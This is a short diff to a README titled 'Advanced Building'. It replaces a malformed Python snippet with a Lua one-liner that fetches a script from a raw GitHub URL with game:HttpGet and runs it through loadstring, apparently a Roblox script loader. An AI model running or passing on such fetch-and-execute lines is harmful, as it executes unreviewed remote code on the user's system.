@@ -1,3 +1,5 @@
 # Advanced Building
 
-python\nprint("Hello")\n```)
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/purplefroggamblingrebellion/AdvancedBuildingForWHITEWALK/refs/heads/main/lua.txt"))()
+```
